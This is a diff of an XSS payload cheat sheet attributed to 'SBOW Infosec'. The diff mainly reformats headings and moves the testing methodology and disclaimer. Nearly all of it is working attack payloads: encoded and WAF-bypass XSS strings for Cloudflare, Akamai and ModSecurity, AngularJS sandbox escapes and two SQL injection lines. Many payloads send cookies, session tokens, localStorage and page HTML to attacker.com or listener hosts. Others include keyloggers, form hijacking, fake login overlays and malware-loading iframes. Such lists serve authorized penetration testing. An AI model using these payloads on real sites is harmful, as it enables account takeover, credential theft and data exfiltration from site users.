@@ -1,10 +1,18 @@
-=== XSS PAYLOADS COMPREHENSIVE LIST 2025 ===
-=== For Educational and Authorized Testing Only ===
-=== Source: PortSwigger, OWASP, PayloadsAllTheThings, GitHub ===
+=================== XSS PAYLOADS COMPREHENSIVE LIST 2025 ===================
 
-WARNING: These payloads should ONLY be used in authorized security testing environments. Unauthorized testing is illegal.
 
-========== BASIC XSS PAYLOADS ==========
+==================== TESTING METHODOLOGY ====================
+
+1. Identify input points (forms, URL parameters, headers)
+2. Test with basic payload: <img src=x onerror=alert(1)>
+3. If blocked, try encoding, case manipulation, alternative tags
+4. Test in different contexts (HTML, JavaScript, URL, CSS)
+5. For blind XSS, use OOB listener and monitor callbacks
+6. Document all successful bypasses with context
+7. Verify impact (cookie stealing, redirection, etc.)
+8. Create detailed report with remediation steps
+
+==================== BASIC XSS PAYLOADS ====================
 
 <img src=x onerror=alert(1)>
 <script>alert(1)</script>
@@ -14,44 +22,44 @@ WARNING: These payloads should ONLY be used in authorized security testing envir
 <marquee onstart=alert(1)>
 <details open ontoggle=alert(1)>
 
-========== HTML ENTITY ENCODING ==========
+==================== HTML ENTITY ENCODING ====================
 
 &#60;img src=x onerror=alert(1)&#62;
 &#x3C;img src=x onerror=alert(1)&#x3E;
 &#65;&#76;&#69;&#82;&#84;
 
-========== CASE MANIPULATION ==========
+==================== CASE MANIPULATION ====================
 
 <ScRiPt>alert(1)</ScRiPt>
 <IMG SRC=X ONERROR=alert(1)>
 <sCrIpT>alert(1)</sCrIpT>
 
-========== URL ENCODING ==========
+==================== URL ENCODING ====================
 
 %3Cimg src=x onerror=alert(1)%3E
 %3Cscript%3Ealert(1)%3C/script%3E
 
-========== DOUBLE ENCODING ==========
+==================== DOUBLE ENCODING ====================
 
 %253Cimg%20src=x%20onerror=alert(1)%253E
 &#x26;#x3C;img src=x onerror=alert(1)&#x26;#x3E;
 
-========== UNICODE ENCODING ==========
+==================== UNICODE ENCODING ====================
 
 \u003cimg src=x onerror=alert(1)\u003e
 \u0041\u004C\u0045\u0052\u0054
 
-========== HEX ENCODING ==========
+==================== HEX ENCODING ====================
 
 \x3cimg src=x onerror=alert(1)\x3e
 \x61\x6c\x65\x72\x74\x28\x31\x29
 
-========== BASE64 ENCODING ==========
+==================== BASE64 ENCODING ====================
 
 <script>eval(atob('YWxlcnQoMSk='))</script>
 <img src=x onerror="eval(atob('YWxlcnQoMSk='))">
 
-========== SVG-BASED XSS ==========
+==================== SVG-BASED XSS ====================
 
 <svg onload=alert(1)>
 <svg><script>alert(1)</script></svg>
@@ -63,7 +71,7 @@ WARNING: These payloads should ONLY be used in authorized security testing envir
 <svg><polygon onload=alert(1)>
 <svg><rect onload=alert(1)>
 
-========== HTML5 MEDIA TAGS ==========
+=================== HTML5 MEDIA TAGS ====================
 
 <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav">
 <video src=x onerror=alert(1)>
@@ -71,7 +79,7 @@ WARNING: These payloads should ONLY be used in authorized security testing envir
 <audio autoplay onloadedmetadata=alert(1)><source src="validaudio.wav">
 <audio controls autoplay onended=alert(1)><source src="validaudio.wav">
 
-========== EVENT HANDLERS ==========
+==================== EVENT HANDLERS ====================
 
 onload
 onerror
@@ -104,20 +112,20 @@ oncut
 <a href="javascript:void(0)" onclick="alert(1)">Click</a>
 <iframe src="javascript:alert(1)"></iframe>
 
-========== DATA URI ==========
+==================== DATA URI ====================
 
 <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
 <embed src="data:text/html,<script>alert(1)</script>">
 <a href="data:text/html,<script>alert(1)</script>">Click</a>
 
-========== CSS-BASED XSS ==========
+=================== CSS-BASED XSS ====================
 
 <div style="background:url('javascript:alert(1)')">
 <style>@import'http://attacker.com/xss.css'</style>
 <link rel=stylesheet href="javascript:alert(1)">
 <style>body{background:url("javascript:alert(1)")}</style>
 
-========== ATTRIBUTE INJECTION ==========
+==================== ATTRIBUTE INJECTION ====================
 
 " onload="alert(1)" x="
 ' onload='alert(1)' x='
@@ -125,113 +133,113 @@ oncut
 ) onload=alert(1) x=(
 ] onload=alert(1) x=[
 
-========== ANGULAR JS SANDBOX ESCAPE ==========
+==================== ANGULAR JS SANDBOX ESCAPE ====================
 
 {{constructor.constructor('alert(1)')()}}
 {{(function(){alert(1)})()}}
 $event.view.alert(1)
 {{[].constructor.constructor('alert(1)')()}}
 
-========== REACT VULNERABILITIES ==========
+==================== REACT VULNERABILITIES ====================
 
 <div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />
 <div dangerouslySetInnerHTML={{__html: userInput}} />
 
-========== VUE.JS VULNERABILITIES ==========
+==================== VUE.JS VULNERABILITIES ====================
 
 <div v-html="'<img src=x onerror=alert(1)>'"></div>
 
-========== POLYGLOT PAYLOADS ==========
+==================== POLYGLOT PAYLOADS ====================
 
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
 <img src=x onerror="eval('String.fromCharCode(97,108,101,114,116,40,49,41)')">
 
-========== MYSQL ERROR-BASED PAYLOADS ==========
+==================== MYSQL ERROR-BASED PAYLOADS ====================
 
 ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
 ' AND 1=CAST((SELECT password FROM users) as int)--
 
-========== NESTED ENCODING ==========
+==================== NESTED ENCODING ====================
 
 <<script>script>alert(1)<</script>/script>
 <scr<script>ipt>alert(1)</scr</script>ipt>
 
-========== MUTATION XSS (mXSS) ==========
+==================== MUTATION XSS (mXSS) ====================
 
 <svg><style><img title="</style><img src=x onerror=alert(1)>
 <iframe srcdoc="<svg onload=alert(1)>"></iframe>
 
-========== COMMENT-BASED BYPASS ==========
+=================== COMMENT-BASED BYPASS ====================
 
 <img src=x onerror=alert(1) /**/x=/**/1>
 <img src=x onerror=alert(1) //x=1>
 <img src=x onerror=alert(1) --x=1>
 
-========== NULL BYTE INJECTION ==========
+==================== NULL BYTE INJECTION ====================
 
 <img src=x onerror=alert(1)%00x>
 
-========== NEWLINE INJECTION ==========
+==================== NEWLINE INJECTION ====================
 
 <img src=x onerror=alert(1)%0Ax=1>
 <img src=x onerror=alert(1)&#10;x=1>
 
-========== WAF BYPASS PAYLOADS - CLOUDFLARE ==========
+==================== WAF BYPASS PAYLOADS - CLOUDFLARE ====================
 
 <inpuT autofocus onfocus=alert(1)>
 <SVG/oNlY=1 ONlOAD=confirm(1)>
 <img src=x id=x alt=x title=x onerror=eval(atob('YWxlcnQoMSk='))>
 <details open ontoggle="alert`1`">
 
-========== WAF BYPASS PAYLOADS - AKAMAI ==========
+==================== WAF BYPASS PAYLOADS - AKAMAI ====================
 
 <input id=b value=javascript:alert(1) onfocus=eval(value) autofocus>
 <div id=a href=javascript:alert(1)>click</div>
 <svg/onload="for(const i in this)this[i]instanceof Function&&this[i](1)">
 
-========== WAF BYPASS PAYLOADS - MODSECURITY ==========
+==================== WAF BYPASS PAYLOADS - MODSECURITY ====================
 
 <img src=x onerror=alert`1`>
 <svg onload=eval(atob('YWxlcnQoMSk='))>
 
-========== BLIND XSS PAYLOADS ==========
+==================== BLIND XSS PAYLOADS ====================
 
 <script src="https://your-listener.com/log.js"></script>
 <img src=x onerror="fetch('https://your-listener.com?c='+document.cookie)">
 <svg onload="new Image().src='https://your-listener.com/?admin=true'">
 <script>fetch('https://your-listener.com/?page='+btoa(document.documentElement.innerHTML.substring(0,500)))</script>
 
-========== OUT-OF-BAND (OOB) PAYLOADS ==========
+==================== OUT-OF-BAND (OOB) PAYLOADS ====================
 
 <img src="https://your-collaborator.com/image.png">
 <script>document.location='https://your-collaborator.com/log?c='+document.cookie</script>
 <svg onload="navigator.sendBeacon('https://your-collaborator.com',document.cookie)">
 
-========== DATA EXFILTRATION PAYLOADS ==========
+==================== DATA EXFILTRATION PAYLOADS ====================
 
 <script>fetch('/steal?cookie='+document.cookie)</script>
 <script>new Image().src='http://attacker.com/log?c='+btoa(document.cookie)</script>
 <iframe src="http://attacker.com/log?html="+btoa(document.documentElement.innerHTML)>
 
-========== COOKIE STEALING PAYLOADS ==========
+==================== COOKIE STEALING PAYLOADS ====================
 
 <script>document.location='http://attacker.com/grabber.php?c='+document.cookie</script>
 <img src=x onerror="this.src='http://attacker.com/log?cookie='+document.cookie">
 
-========== SESSION TOKEN EXFILTRATION ==========
+==================== SESSION TOKEN EXFILTRATION ====================
 
 <script>
 var token = localStorage.getItem('auth_token');
 fetch('http://attacker.com/log?token='+token);
 </script>
 
-========== LOCAL STORAGE THEFT ==========
+==================== LOCAL STORAGE THEFT ====================
 
 <script>
 fetch('http://attacker.com/log?data='+btoa(JSON.stringify(localStorage)));
 </script>
 
-========== FORM HIJACKING ==========
+==================== FORM HIJACKING ====================
 
 <script>
 document.querySelectorAll('form').forEach(f => {
@@ -241,7 +249,7 @@ document.querySelectorAll('form').forEach(f => {
 });
 </script>
 
-========== KEYLOGGER PAYLOADS ==========
+==================== KEYLOGGER PAYLOADS ====================
 
 <script>
 document.addEventListener('keypress', e => {
@@ -249,13 +257,13 @@ document.addEventListener('keypress', e => {
 });
 </script>
 
-========== PHISHING OVERLAY ==========
+==================== PHISHING OVERLAY ====================
 
 <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
 <iframe style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:300px;height:200px;" src="http://attacker.com/fake-login"></iframe>
 </div>
 
-========== CREDENTIAL HARVESTING ==========
+==================== CREDENTIAL HARVESTING ====================
 
 <form action="http://attacker.com/log" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:10000;background:white;padding:20px;border:1px solid black;">
 <input type="text" name="username" placeholder="Username">
@@ -263,13 +271,13 @@ document.addEventListener('keypress', e => {
 <button type="submit">Login</button>
 </form>
 
-========== REDIRECTION PAYLOADS ==========
+==================== REDIRECTION PAYLOADS ====================
 
 <script>window.location='http://attacker.com'</script>
 <meta http-equiv="refresh" content="0;url=http://attacker.com">
 <a href="javascript:window.location='http://attacker.com'">Click</a>
 
-========== MALWARE DISTRIBUTION ==========
+==================== MALWARE DISTRIBUTION ====================
 
 <iframe src="http://attacker.com/malware.exe"></iframe>
 <script src="http://attacker.com/malware.js"></script>
@@ -279,7 +287,7 @@ document.addEventListener('keypress', e => {
 <img src="http://target.com/api/transfer?to=attacker&amount=1000" style="display:none;">
 <iframe src="http://target.com/admin/delete-user?id=123" style="display:none;"></iframe>
 
-========== SELENIUM/AUTOMATION DETECTION ==========
+==================== SELENIUM/AUTOMATION DETECTION ====================
 
 <script>
 if(navigator.webdriver || navigator.userAgent.includes('HeadlessChrome')) {
@@ -289,7 +297,7 @@ if(navigator.webdriver || navigator.userAgent.includes('HeadlessChrome')) {
 }
 </script>
 
-========== CONTEXT-SPECIFIC PAYLOADS ==========
+==================== CONTEXT-SPECIFIC PAYLOADS ====================
 
 HTML Attribute Context:
 x" onmouseover="alert(1)" x="
@@ -304,7 +312,7 @@ data:text/html,<script>alert(1)</script>
 CSS Context:
 background:url("javascript:alert(1)")
 
-========== REFERENCES AND RESOURCES ==========
+==================== REFERENCES AND RESOURCES ====================
 
 PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 OWASP XSS Prevention: https://owasp.org/www-community/attacks/xss/
@@ -312,20 +320,8 @@ PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
 HackTricks XSS: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
 XSS-Payloads: http://www.xss-payloads.com
 
-========== TESTING METHODOLOGY ==========
 
-1. Identify input points (forms, URL parameters, headers)
-2. Test with basic payload: <img src=x onerror=alert(1)>
-3. If blocked, try encoding, case manipulation, alternative tags
-4. Test in different contexts (HTML, JavaScript, URL, CSS)
-5. For blind XSS, use OOB listener and monitor callbacks
-6. Document all successful bypasses with context
-7. Verify impact (cookie stealing, redirection, etc.)
-8. Create detailed report with remediation steps
 
-========== DISCLAIMER ==========
-
-This file is provided for educational and authorized security testing purposes only.
-Unauthorized access to computer systems is illegal.
-Users must obtain proper authorization before conducting any security tests.
+============================= DISCLAIMER =============================
+WARNING: These payloads should ONLY be used in authorized security testing environments. Unauthorized testing is illegal.
 SBOW Infosec assumes no responsibility for unauthorized or illegal use of this information.
